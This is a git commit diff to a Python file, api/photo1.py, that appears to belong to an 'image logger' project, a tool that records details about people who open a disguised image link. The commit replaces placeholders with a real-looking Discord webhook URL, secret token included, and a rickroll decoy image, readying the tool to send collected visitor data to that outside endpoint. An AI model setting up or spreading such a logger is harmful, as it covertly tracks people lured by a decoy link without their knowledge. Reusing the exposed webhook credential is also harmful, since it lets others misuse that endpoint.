599a30e3721675de13dd3694277bbf190e8c8dac
k0pItik <133521472+k0pItik@users.noreply.github.com>
2023-05-13 18:36:13 +0200

    Update photo1.py

--- api/photo1.py
+++ api/photo1.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1106967165267099738/FsXMM5N1s4EJIvCaxXj1ZtvqEmbzOLTsWTh-wkkSy1sYQdaEHAF0OjtDAsMWuZgyPyTW",
+    "image": "https://cdn.vox-cdn.com/thumbor/WR9hE8wvdM4hfHysXitls9_bCZI=/0x0:1192x795/1400x1400/filters:focal(596x398:597x399)/cdn.vox-cdn.com/uploads/chorus_asset/file/22312759/rickroll_4k.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
